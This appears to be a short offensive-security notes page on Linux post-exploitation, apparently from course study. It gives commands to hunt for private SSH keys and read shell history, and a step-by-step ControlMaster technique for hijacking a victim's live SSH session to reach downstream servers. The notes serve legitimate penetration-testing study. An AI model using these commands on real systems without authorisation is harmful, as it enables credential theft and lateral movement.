# Linux

## General

Look for private keys

```bash
find /home/ -name "id_rsa"
```

View .bash\_history files

```bash
cat .bash_history
```

## SSH Hijacking

The term SSH hijacking refers to the use of an existing SSH connection to gain access to another machine. Two of the most common methods of SSH hijacking use the _ControlMaster_ feature or the _ssh-agent_.

### ControlMaster

ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network connection. This functionality can be enabled for a given user by editing their local SSH configuration file (\~/.ssh/config). If a user is connecting then connecting to a downstream server we can hijack that connection.&#x20;

{% code overflow="wrap" %}
```bash
# Create ~/.ssh/config 
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
# Change file permissions
chmod 644 ~/.ssh/config
# Creating the controlmaster socket directory
mkdir ~/.ssh/controlmaster
# Once victim has created connection check for a ControlMaster socket
ls -al ~/.ssh/controlmaster/
# We can then connect as the user to the downstream server (Must be logged into users session)
ssh victim@downstream
# If running as root
ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 victim@downstream
```
{% endcode %}

### SSH-Agent

```bash
# In /etc/ssh/sshd_config ensure below setting is set. 
AllowAgentForwarding yes
```
